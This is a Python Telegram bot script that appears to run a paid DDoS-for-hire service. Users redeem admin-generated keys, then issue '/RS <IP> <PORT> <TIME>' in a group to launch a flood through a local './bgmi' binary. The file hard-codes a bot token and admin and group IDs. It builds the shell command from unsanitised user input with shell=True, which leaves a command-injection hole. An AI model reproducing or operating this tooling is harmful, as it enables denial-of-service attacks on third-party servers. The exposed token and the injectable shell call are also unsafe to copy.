#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
import random
import string
from telebot import types

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7973805250:AAE1umqUG8ZhI5Ev0FQe5w-NmkdDtI-dXBs')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002252633433"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
ADMINS = [7129010361]

# GLOBAL VARIABLES
pending_feedback = {}
warn_count = {}
attack_logs = []
user_attack_count = {}
keys = {}  # Store generated keys with expiry dates
redeemed_users = {}  # Store redeemed users with expiry
active_attacks = []  # Track active attacks

# FUNCTION TO CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# FUNCTION TO GENERATE RANDOM KEYS
def generate_key(length=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# /GENKEY COMMAND (ADMIN ONLY)
@bot.message_handler(commands=['genkey'])
def generate_access_key(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ USAGE: /genkey <DAYS>")
        return

    try:
        days = int(command[1])
    except ValueError:
        bot.reply_to(message, "❌ DAYS MUST BE A NUMBER!")
        return

    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    new_key = generate_key()
    keys[new_key] = expiry_date

    bot.reply_to(message, f"✅ NEW KEY GENERATED:\n🔑 `{new_key}`\n📅 Expiry: {expiry_date.strftime('%Y-%m-%d')}", parse_mode="Markdown")

# /REDEEM COMMAND
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ USAGE: /redeem <KEY>")
        return

    user_id = message.from_user.id
    key = command[1]

    if key not in keys:
        bot.reply_to(message, "❌ INVALID KEY!")
        return

    if datetime.datetime.now() > keys[key]:
        bot.reply_to(message, "⏳ THIS KEY HAS EXPIRED!")
        del keys[key]
        return

    redeemed_users[user_id] = keys[key]  # Store user with expiry date
    del keys[key]

    bot.reply_to(message, "🎉 SUCCESSFULLY REDEEMED! AB TU UNLIMITED ATTACK KAR SAKTA HAI 🚀", parse_mode="Markdown")

# /MYINFO COMMAND
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = message.from_user.id
    info_msg = f"👤 **USER INFO**\n\n🆔 **Telegram ID:** `{user_id}`\n"

    if user_id in redeemed_users:
        expiry = redeemed_users[user_id].strftime('%Y-%m-%d')
        info_msg += f"✅ **Access Granted:** Yes\n📅 **Expires on:** {expiry}\n"
    else:
        info_msg += "❌ **Access Granted:** No\n"

    attack_count = user_attack_count.get(user_id, 0)
    info_msg += f"🚀 **Total Attacks:** {attack_count}\n"

    bot.reply_to(message, info_msg, parse_mode="Markdown")

# HANDLE ATTACK COMMAND (UNLIMITED ATTACKS ENABLED)
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if user_id not in redeemed_users:
        bot.reply_to(message, "❌ PEHLE /redeem KARKAY ACCESS LO!")
        return

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 YE BOT SIRF GROUP ME CHALEGA! ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ PEHLE CHANNEL JOIN KAR! {CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "PEHLE SCREENSHOT BHEJ, WARNA NAYA ATTACK NAHI MILEGA! 😡")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ USAGE: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT AUR TIME NUMBER HONE CHAHIYE!")
        return

    if time_duration > 500:
        bot.reply_to(message, "🚫 700S SE ZYADA ALLOWED NAHI HAI!")
        return

    confirm_msg = f"🔥 ATTACK DETAILS:\n🎯 TARGET: `{target}`\n🔢 PORT: `{port}`\n⏳ DURATION: `{time_duration}S`\nSTATUS: `CHAL RAHA HAI...`\n📸 ATTACK KE BAAD SCREENSHOT BHEJNA ZAROORI HAI!"

    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")

    # ADD ATTACK TO ACTIVE LIST
    attack_info = {"user_id": user_id, "target": target, "port": port, "time": time_duration}
    active_attacks.append(attack_info)

    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1  # Update attack count

    # ATTACK EXECUTION
    def attack_execution():
        try:
            subprocess.run(f"./bgmi {target} {port} {time_duration} 100", shell=True, check=True, timeout=time_duration)
        except subprocess.TimeoutExpired:
            bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ ATTACK FAIL HO GAYA!")
        finally:
            bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
            active_attacks.remove(attack_info)

    threading.Thread(target=attack_execution).start()

# /CHECK COMMAND TO SEE ACTIVE ATTACKS
@bot.message_handler(commands=['check'])
def check_attacks(message):
    if not active_attacks:
        bot.reply_to(message, "❌ KOI BHI ATTACK ACTIVE NAHI HAI!")
        return

    check_msg = "📊 **ACTIVE ATTACKS:**\n\n"
    for attack in active_attacks:
        check_msg += f"👤 `{attack['user_id']}` ➝ 🎯 `{attack['target']}:{attack['port']}` ({attack['time']}s)\n"

    bot.send_message(message.chat.id, check_msg, parse_mode="Markdown")

# START POLLING
bot.polling(none_stop=True)